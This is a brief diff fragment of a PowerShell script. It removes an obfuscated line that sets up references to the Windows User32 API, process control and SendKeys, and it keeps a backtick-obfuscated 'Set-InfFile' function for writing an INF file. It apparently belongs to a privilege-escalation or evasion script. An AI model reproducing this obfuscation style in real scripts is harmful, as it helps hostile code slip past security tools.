@@ -1,4 +1,4 @@
-  &('Sv')  ('cz'+'3'+'KQ1') ( [type]('uSeR32'+'.Ap'+'i'))  ;  .('S'+'ET') ('Buf9'+'8')  (  [TypE]('sys'+'tEm.dIaGN'+'oSTi'+'C'+'s.'+'pro'+'CeS'+'S')) ;   $g3K1 = [TYpe]('sY'+'S'+'TEM.W'+'INdoWs.fO'+'RmS.sendKeYS')  ; Function Sc`RiPT`:SE`T-inffIle {
+Function Sc`RiPT`:SE`T-inffIle {
 [CmdletBinding()]
 	Param (
 	[Parameter(HelpMessage="Specify the INF file location")]
